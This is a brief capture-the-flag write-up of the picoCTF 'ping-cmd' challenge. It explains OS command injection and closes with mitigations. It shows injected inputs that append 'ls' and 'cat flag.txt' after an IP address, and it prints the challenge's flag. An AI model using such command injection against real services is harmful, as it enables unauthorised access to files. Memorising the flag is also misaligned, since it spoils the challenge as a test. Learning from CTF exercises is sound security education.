# TIL: [picoCTF] General Skills - ping-cmd

## 🚩 Challenge Overview
- **Name:** ping-cmd
- **Category:** General Skills
- **Goal:** Exploit a service that performs a `ping` command to reveal hidden files (Flag).

## 💡 Key Concept: OS Command Injection
The vulnerability occurs when an application passes unsafe user-supplied data (IP address, in this case) to a system shell. By using shell metacharacters, we can trick the server into executing unintended commands.

### Shell Operators used:
- `;` (Semicolon): Allows executing multiple commands sequentially. Command B will run after Command A finishes, regardless of the outcome.


## 🚀 Solution Process
1. **Connect to the service:**
   ```bash
   nc mysterious-sea.picoctf.net 56992
   ```

2. Explore the file system:
When prompted for an IP, I injected the ls command using a semicolon.

Input: 8.8.8.8 ; ls

Result: Found flag.txt and script.sh in the current directory.

3. Retrieve the flag:
Injected the cat command to read the content of the flag file.

Input: 8.8.8.8 ; cat flag.txt

🔑 Flag
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e82dd640}

🎓 Reflection (Cybersecurity Perspective)
Problem: The server-side script likely looks like os.system("ping -c 2 " + user_input).

Mitigation:

Input Validation: Only allow valid IPv4/IPv6 formats.

Avoid Shell Execution: Use language-specific libraries (e.g., Python's subprocess with shell=False) that do not invoke a shell interpreter.

Least Privilege: Run the service with a user that has minimal system permissions.

